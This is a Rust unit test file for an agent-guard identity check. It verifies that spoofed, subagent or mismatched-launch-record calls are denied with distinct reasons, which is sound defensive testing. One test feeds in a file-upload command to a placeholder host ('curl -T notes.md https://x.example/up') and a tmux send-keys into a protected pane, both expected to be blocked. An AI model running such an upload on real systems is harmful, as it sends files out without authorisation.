//! Unit tests for the #8878 PR-I identity reason (`pm_guard_architect_reason.rs`).

use std::collections::HashSet;
use std::path::Path;

use serde_json::json;
use trusty_mpm::core::architect_launch::{self, ARCHITECT_RECORDS};
use trusty_mpm::core::twin_identity::ClaudeProcess;

use super::*;
use crate::commands::pm_guard_bash::{ARCHITECT_PANE_RULE, LiveGit};
use crate::commands::pm_guard_floor::tests::{ArchitectPane, NoArchitect};
use crate::commands::pm_guard_floor::{ArchitectGate, D4_FLOOR_RULE, Probes, evaluate_floors};
use crate::commands::pm_guard_trust_anchor::tests::{
    ARCHITECT, Fixture, allowlist, architect_env, architect_table, fixture, launch_record, payload,
    spoof_env, table,
};
use crate::commands::pm_guard_trust_anchor::{evaluate, is_architect_main_thread};
use trusty_mpm::daemon::bug_report::{DeniedCall, denial_record};

/// One identity case: the call, its environment, and whether the allowlist
/// grants the Architect directory.
pub(crate) struct Case {
    pub(crate) name: &'static str,
    pub(crate) call: Value,
    pub(crate) env: HookEnv,
    pub(crate) granted: bool,
    pub(crate) want: Result<(), NotArchitect>,
}

/// The user config a case runs under.
fn config_for(fx: &Fixture, granted: bool) -> MpmConfig {
    if granted {
        allowlist(fx)
    } else {
        MpmConfig::default()
    }
}

/// An anchor write from the main thread: denied unless the Architect.
fn anchor_write(fx: &Fixture) -> Value {
    let anchor = fx.anchor.display().to_string();
    payload(fx, "Write", json!({ "file_path": anchor, "content": "x" }))
}

/// Move the record written for `from` to `to`'s file name.
fn rename_record(fx: &Fixture, from: u32, to: u32) {
    let root = fx.home.join(".trusty-mpm");
    let src = ARCHITECT_RECORDS.path(&root, from);
    std::fs::rename(src, ARCHITECT_RECORDS.path(&root, to)).expect("rename record");
}

/// Every identity outcome, each in its own fixture. The fixture is returned
/// so its temp directory outlives the case. #8939 reuses it for the env-file
/// exemption.
pub(crate) fn cases() -> Vec<(Fixture, Case)> {
    use LaunchRefusal as L;
    use NotArchitect as N;
    let mut out = Vec::new();
    let mut add = |name, build: &dyn Fn(&Fixture) -> (Value, HookEnv, bool), want| {
        let fx = fixture();
        let (call, env, granted) = build(&fx);
        out.push((
            fx,
            Case {
                name,
                call,
                env,
                granted,
                want,
            },
        ));
    };
    let main = |fx: &Fixture| anchor_write(fx);
    let with_table = |fx: &Fixture| HookEnv {
        claude: table(architect_table()),
        ..spoof_env(fx)
    };
    add(
        "the Architect",
        &|fx| (main(fx), architect_env(fx), true),
        Ok(()),
    );
    add(
        "unknown thread",
        &|fx| {
            let mut call = main(fx);
            call.as_object_mut().expect("object").remove("session_id");
            (call, architect_env(fx), true)
        },
        Err(N::UnknownThread),
    );
    add(
        "subagent",
        &|fx| {
            let mut call = main(fx);
            call["agent_id"] = json!("agent-7");
            (call, architect_env(fx), true)
        },
        Err(N::Subagent),
    );
    add(
        "no stamp",
        &|fx| {
            let env = HookEnv {
                stamp: None,
                ..architect_env(fx)
            };
            (main(fx), env, true)
        },
        Err(N::NoSupervisorStamp),
    );
    add(
        "no project dir",
        &|fx| {
            let env = HookEnv {
                project_dir: None,
                ..architect_env(fx)
            };
            (main(fx), env, true)
        },
        Err(N::NoProjectDir),
    );
    add(
        "profile not requested",
        &|fx| {
            let env = HookEnv {
                project_dir: Some(fx.cwd.clone().into_os_string()),
                ..architect_env(fx)
            };
            (main(fx), env, true)
        },
        Err(N::ProfileNotRequested),
    );
    add(
        "not allow-listed",
        &|fx| (main(fx), architect_env(fx), false),
        Err(N::NotAllowListed),
    );
    add(
        "unknown home",
        &|fx| {
            let env = HookEnv {
                home: None,
                ..architect_env(fx)
            };
            (main(fx), env, true)
        },
        Err(N::UnknownHome),
    );
    add(
        "process lookup error",
        &|fx| (main(fx), spoof_env(fx), true),
        Err(N::Launch(L::ProcessLookup)),
    );
    add(
        "no claude parent",
        &|fx| {
            let env = HookEnv {
                claude: table(vec![(100, Some(1), false), (1, None, false)]),
                ..spoof_env(fx)
            };
            (main(fx), env, true)
        },
        Err(N::Launch(L::NoClaudeAncestor)),
    );
    add(
        "launch record missing",
        &|fx| (main(fx), with_table(fx), true),
        Err(N::Launch(L::NoLaunchRecord)),
    );
    add(
        "record unreadable",
        &|fx| {
            let path = launch_record(fx, ARCHITECT, &fx.project);
            std::fs::write(path, "not json").expect("corrupt the record");
            (main(fx), with_table(fx), true)
        },
        Err(N::Launch(L::UnreadableRecord)),
    );
    add(
        "record names another pid",
        &|fx| {
            let other = ClaudeProcess {
                pid: 61,
                ..ARCHITECT
            };
            launch_record(fx, other, &fx.project);
            rename_record(fx, 61, ARCHITECT.pid);
            (main(fx), with_table(fx), true)
        },
        Err(N::Launch(L::RecordPidMismatch)),
    );
    add(
        "start-time mismatch",
        &|fx| {
            let reused = ClaudeProcess {
                start_time: 599,
                ..ARCHITECT
            };
            launch_record(fx, reused, &fx.project);
            (main(fx), with_table(fx), true)
        },
        Err(N::Launch(L::StartTimeMismatch)),
    );
    add(
        "record for another project",
        &|fx| {
            launch_record(fx, ARCHITECT, &fx.cwd);
            (main(fx), with_table(fx), true)
        },
        Err(N::Launch(L::OtherProject)),
    );
    out
}

/// The identity verdict at 760ba280c8, before PR-I: the bool body verbatim,
/// with `is_launched_architect`'s old body inlined.
fn pre_change_bool(payload: &Value, env: &HookEnv, config: impl FnOnce() -> MpmConfig) -> bool {
    use trusty_mpm::core::session_profile;
    use trusty_mpm::core::twin_identity::{ThreadKind, thread_kind};
    if thread_kind(payload, env.sub_agent) != ThreadKind::Main
        || !session_profile::hook_profile(env.stamp.clone(), env.project_dir.clone(), config)
            .is_supervisor()
    {
        return false;
    }
    let (Some(home), Some(project)) = (
        env.home.as_deref(),
        session_profile::hook_project_dir(env.project_dir.clone()),
    ) else {
        return false;
    };
    let root = home.join(ANCHOR_ROOT);
    let Ok(Some(claude)) = env.claude.get() else {
        return false;
    };
    let Ok(Some(record)) = architect_launch::ARCHITECT_RECORDS.read(&root, claude.pid) else {
        return false;
    };
    record.pid == claude.pid
        && record.start_time == claude.start_time
        && same_dir(&record.project_dir, &project)
}

/// `twin_identity::same_dir`, which is private to the library.
fn same_dir(a: &Path, b: &Path) -> bool {
    match (std::fs::canonicalize(a), std::fs::canonicalize(b)) {
        (Ok(a), Ok(b)) => a == b,
        _ => false,
    }
}

/// Each check yields its own reason; none carries a digit (no PID or start
/// time) or an environment value.
#[test]
fn each_identity_failure_names_its_own_reason() {
    let mut reasons = HashSet::new();
    let mut failures = 0;
    for (fx, case) in cases() {
        let got = architect_main_thread(&case.call, &case.env, || config_for(&fx, case.granted));
        assert_eq!(got, case.want, "{}", case.name);
        let Err(why) = got else { continue };
        failures += 1;
        let text = why.to_string();
        assert!(
            !text.chars().any(|c| c.is_ascii_digit()),
            "{}: {text}",
            case.name
        );
        assert!(!text.contains(&fx.project.display().to_string()), "{text}");
        reasons.insert(text);
    }
    assert_eq!(failures, 14, "one case per check");
    assert_eq!(reasons.len(), failures, "a reason is shared: {reasons:#?}");
}

/// The allow/deny verdict of every case equals the pre-change bool, and the
/// bool wrapper agrees with both.
#[test]
fn the_reason_verdict_equals_the_bool_verdict() {
    for (fx, case) in cases() {
        let config = || config_for(&fx, case.granted);
        let old = pre_change_bool(&case.call, &case.env, config);
        let new = architect_main_thread(&case.call, &case.env, config).is_ok();
        assert_eq!(new, old, "{}", case.name);
        assert_eq!(is_architect_main_thread(&case.call, &case.env, config), old);
        assert_eq!(old, case.want.is_ok(), "{}", case.name);
    }
}

/// Fail-Open Check: every failing arm denies an anchor write, the D4
/// remainder and a tmux verb into the Architect's pane (#8902); each deny
/// and the audit line name the failed check.
#[test]
fn a_deny_names_the_failed_identity_check() {
    for (fx, case) in cases() {
        let config = || config_for(&fx, case.granted);
        let anchor = evaluate(&case.call, &case.env, config);
        let mut d4_call = case.call.clone();
        d4_call["tool_name"] = json!("Bash");
        d4_call["tool_input"] = json!({ "command": "curl -T notes.md https://x.example/up" });
        let gate = ArchitectGate::new(&d4_call, case.env.clone(), config);
        let no_architect = Probes {
            git: &LiveGit,
            panes: &NoArchitect,
        };
        let d4 = evaluate_floors(&d4_call, &fx.cwd, &gate, &no_architect, false);
        // #8902: a tmux verb into a live Architect's pane names the check too.
        let mut pane_call = d4_call.clone();
        pane_call["tool_input"] = json!({ "command": "tmux send-keys -t =tm-architect: x" });
        let pane_gate = ArchitectGate::new(&pane_call, case.env.clone(), config);
        let architect_pane = Probes {
            git: &LiveGit,
            panes: &ArchitectPane,
        };
        let pane = evaluate_floors(&pane_call, &fx.cwd, &pane_gate, &architect_pane, false);
        let Err(why) = case.want else {
            assert_eq!(anchor, None, "{}", case.name);
            assert_eq!(d4, None, "{}", case.name);
            assert_eq!(pane, None, "{}", case.name);
            continue;
        };
        let why = why.to_string();
        let anchor = anchor.unwrap_or_else(|| panic!("{}: anchor write allowed", case.name));
        assert!(
            anchor.contains("#8878") && anchor.contains(&why),
            "{anchor}"
        );
        let d4 = d4.unwrap_or_else(|| panic!("{}: D4 allowed", case.name));
        assert_eq!(d4.rule, D4_FLOOR_RULE);
        assert!(d4.reason.contains(&why), "{}: {}", case.name, d4.reason);
        let pane = pane.unwrap_or_else(|| panic!("{}: pane verb allowed", case.name));
        assert_eq!(pane.rule, ARCHITECT_PANE_RULE);
        assert!(pane.reason.contains(&why), "{}: {}", case.name, pane.reason);
        let line = denial_record(
            &DeniedCall {
                check: D4_FLOOR_RULE,
                tool: "Bash",
                command: "",
                cwd: "",
                session_id: "s-1",
                reason: &d4.reason,
            },
            0,
        );
        let escaped = format!("{why:?}");
        let escaped = &escaped[1..escaped.len() - 1];
        assert!(
            line.fields.contains(escaped),
            "{}: {}",
            case.name,
            line.fields
        );
    }
}

/// `tm fleet status` has no payload: a subagent is named from the
/// environment, and every other arm goes through the same checks.
#[test]
fn the_session_binding_matches_the_main_thread_checks() {
    for (fx, case) in cases() {
        if matches!(
            case.want,
            Err(NotArchitect::UnknownThread | NotArchitect::Subagent)
        ) {
            continue;
        }
        let got = session_binding(&case.env, || config_for(&fx, case.granted));
        assert_eq!(got, case.want, "{}", case.name);
    }
    let fx = fixture();
    let nested = HookEnv {
        sub_agent: true,
        ..architect_env(&fx)
    };
    assert_eq!(
        session_binding(&nested, || allowlist(&fx)),
        Err(NotArchitect::Subagent)
    );
}
